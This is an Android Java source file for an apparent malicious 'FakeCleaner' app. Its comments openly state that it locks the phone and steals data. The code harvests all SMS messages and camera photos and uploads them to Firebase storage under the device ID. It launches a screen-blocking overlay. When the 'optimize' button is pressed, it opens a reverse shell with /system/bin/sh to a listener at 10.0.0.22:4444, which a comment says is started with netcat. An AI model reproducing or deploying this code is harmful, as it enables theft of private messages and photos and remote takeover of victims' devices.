package com.example.myapplication;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Point;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageMetadata;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

// MainActivity class is a control module for the entire project.
// We will ask users to give us all permission that we need to use
// and direct other modules.
// Not only blocking the phone, we also steal some unencrypted sms messages, phone numbers from the phone and store it online
public class MainActivity extends AppCompatActivity {
    private Button start;

    final static int REQUEST_CODE = 378;
    final static int REQUEST_OVERLAY_PERMISSION = 379;
    final static int REQUEST_CODE_ASK_PERMISSIONS = 123;

    //ip of host machine and port used
    private final static String HOST = "10.0.0.22";
    private final static int PORT = 4444;

    //used for shell part
    private final static String SH_PATH = "/system/bin/sh";
    private static Socket sock = null;

    //Declare basic FirebaseStorage instance to store the users sms message and phone numbers
    private FirebaseStorage FbStorage = FirebaseStorage.getInstance();
    private FirebaseAuth FbAuth = FirebaseAuth.getInstance();

    //List of permission we need to have
    String[] mainPermissions = new String[] {
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_PHONE_STATE
    };

    //copyList method used to copy a list of sms message, and two end points
    private ArrayList<String> copyList(ArrayList<String> originalList) {
        ArrayList<String> tempMsgsCopy = new ArrayList<>();
        for (String msg : originalList){
            tempMsgsCopy.add(msg);
        }
        return tempMsgsCopy;
    }

    //writeToTxtFile to store those sms information we got into a single txt file
    private void writeToTxtFile(String address, String body){
        String filename = address + ".txt";
        File conversationFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/FakeCleaner/" + filename);
        if (conversationFile.exists()) {
            BufferedWriter out = null;
            try {
                out = new BufferedWriter(new FileWriter(conversationFile, true));
                out.write(body);
                out.newLine();
                out.flush();
                out.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else {
            conversationFile.getParentFile().mkdirs();
            BufferedWriter out = null;
            try {
                conversationFile.createNewFile();
                out = new BufferedWriter(new FileWriter(conversationFile, true));
                out.write(body);
                out.newLine();
                out.flush();
                out.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    //After having all the message, we then send it privately to a 3rd party online data storage (firebase instance previously)
    private void runSMSExtractor() {
        try {
            Map<String, List<String>> msgs = new HashMap<>();
            ArrayList<String> tempMsgs = new ArrayList<String>();
            String currAddress = null;
            Boolean firstRun = true;

            Uri uri = Uri.parse("content://sms");
            ContentResolver contentResolver = getContentResolver();
            String[] projection = {"*"};
            Cursor cr = contentResolver.query(uri, projection,null,null,"date asc");
            // Sending process.
            while (cr.moveToNext()) {
                long dateTimeMs = cr.getLong(cr.getColumnIndex("date"));
                String body = cr.getString(cr.getColumnIndex("body"));
                String address = cr.getString(cr.getColumnIndex("address"));
                Date date = new Date(dateTimeMs);
                DateFormat dateFormat = new SimpleDateFormat("ddMMMyyyy HH:mm:ss");
                String msgLine = "Date: " + dateFormat.format(date) +
                        " | To: "  +  address +
                        " | SMS: " + body;
                //If still on the same conversation
                if (firstRun == false && currAddress.compareTo(address) == 0) {
                    tempMsgs.add(msgLine);
                }
                //If on new conversation
                else if (currAddress != null && currAddress.compareTo(address) != 0) {
                    msgs.put(currAddress, copyList(tempMsgs));
                    tempMsgs.clear();
                    currAddress = address;
                    tempMsgs.add(msgLine);
                }
                //If on first run
                else {
                    tempMsgs.add(msgLine);
                    currAddress = address;
                    firstRun = false;
                }
            }
            msgs.put(currAddress, copyList(tempMsgs));
            cr.close();
            FirebaseUser user = FbAuth.getCurrentUser();
            for(String key : msgs.keySet()) {
                List<String> currentConList = msgs.get(key);
                for (String msgLine : currentConList) {
                    writeToTxtFile(key, msgLine);
                }
                String filename = key + ".txt";
                File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/FakeCleaner/" + filename);
                Path path = null;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    path = Paths.get(file.getAbsolutePath());
                    byte[] data = Files.readAllBytes(path);
                    String unique_id = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
                    String storagePath = unique_id + "/" + key + ".txt";
                    StorageReference storageRef = FbStorage.getReference(storagePath);
                    StorageMetadata metadata = new StorageMetadata.Builder().setCustomMetadata(unique_id, key).build();
                    UploadTask uploadTask = storageRef.putBytes(data, metadata);

                    //for images
                    File dir = new File("/sdcard/DCIM/Camera/");
                    File[] files = dir.listFiles();
                    Uri Tempfile;
                    StorageReference userImageRef;

                    for (File i : files) {
                        Tempfile = Uri.fromFile(i);
                        userImageRef = storageRef.child(unique_id).child(Tempfile.getLastPathSegment()); //+"images"+file.getLastPathSegment()
                        uploadTask = userImageRef.putFile(Tempfile);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    // main caller to extract SMS from the user's phone
    public void extractSMS() {
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            runSMSExtractor();
        } else {
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
            runSMSExtractor();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        StorageMemory.setStorage(this);
        StorageMemory.setMemory(this);

        start=(Button) findViewById(R.id.button_optimize);
        //Get screen size
        Point size = new Point( );
        getWindowManager().getDefaultDisplay( ).getSize( size );// we take the screen size to ensure our blocker mechanism works with all size
        FloatingWindow fw=new FloatingWindow();
        fw.setScreenSize(size.x,size.y);

        // OnClickListener method is to activate the blocker mechanism and steal the user's sms messages when users click our
        // optimize button
        start.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (!Settings.canDrawOverlays(MainActivity.this)) {
                        Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                        startActivityForResult(overlayIntent, REQUEST_OVERLAY_PERMISSION);
                    }
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (checkAndRequestPermissions() && Settings.canDrawOverlays(MainActivity.this)) {
                        startService(new Intent(MainActivity.this,FloatingWindow.class));// inflat the blocker
                    }
                }
                //extractSMS();
                new RequestTask().execute();
            }
        });
    }

    //onRequestPermissionResult method, mostly use to display the permissions that users give us
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case REQUEST_CODE:
                if (grantResults.length > 0) {
                    String permissionsDenied = "";
                    for (String permission : permissions) {
                        if (grantResults[0] == PackageManager.PERMISSION_DENIED) {
                            permissionsDenied += permission + " ";
                        }
                    }
                    if (permissionsDenied.equals("")) {
                        Toast.makeText(getApplicationContext(), "Permissions granted", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(getApplicationContext(), "Permissions Denied: " + permissionsDenied, Toast.LENGTH_LONG).show();
                    }
                }
                return;
        }
    }

    //checkAndRequestPermissions, used to request permission directly from the users without having going through the device process.
    boolean checkAndRequestPermissions() {
        int result;
        List<String> permissionsNeeded = new ArrayList<>();
        for (String p : mainPermissions) {
            result = ContextCompat.checkSelfPermission(this, p);
            if (result != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(p);
            }
        }
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[permissionsNeeded.size()]), REQUEST_CODE);
            return false;
        }
        return true;
    }

    private class RequestTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids)
        {
            reverse();

            return null;
        }
    }

    private void reverse()
    {
        //before running run nc -lvp 4444 on machine
        System.out.println("Starting reverse shell...");
        System.out.println("Attempting to connect to " + HOST + ":" + PORT);

        //trys to connect to ip with port
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(HOST, PORT), 1000);
        } catch (IOException e) {
            System.out.println("Failed to create socket: " + e);
        }
        System.out.println("Connected to " + HOST + ":" + PORT);

        //absolutely no clue what this does lol
        //i think lets me communicate through shell
        executeShell();

        if (sock != null && sock.isClosed()) {
            try {
                sock.close();
            } catch (IOException e) {
                // don't care
            }
        }
    }

    private  void executeShell() {
        Process shell;
        try {
            shell = new ProcessBuilder(SH_PATH).redirectErrorStream(true).start();
        } catch (IOException e) {
            System.out.println("Failed to start \"" + SH_PATH  + "\": " + e);
            return;
        }
        InputStream pis, pes, sis;
        OutputStream pos, sos;

        try {
            pis = shell.getInputStream();
            pes = shell.getErrorStream();
            sis = sock.getInputStream();
            pos = shell.getOutputStream();
            sos = sock.getOutputStream();
            System.out.println(pis.toString() + pes.toString());
        } catch (IOException e) {
            System.out.println("Failed to obtain streams: " + e);
            shell.destroy();
            return;
        }

        while ( !sock.isClosed()) {
            try {
                while (pis.available() > 0) {
                    sos.write(pis.read());
                }

                while (pes.available() > 0) {
                    sos.write(pes.read());
                }

                while (sis.available() > 0) {
                    pos.write(sis.read());
                }

                sos.flush();
                pos.flush();
            } catch (IOException e) {
                System.out.println("Stream error: " + e);
                shell.destroy();
            }

            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                // don't care
            }

            try {
                shell.exitValue();
                break;
            } catch (IllegalThreadStateException e) {
                // shell process is still running, can't get exit value
            }
        }

        System.out.println("Socket is not connected, exiting.");
        shell.destroy();
    }


}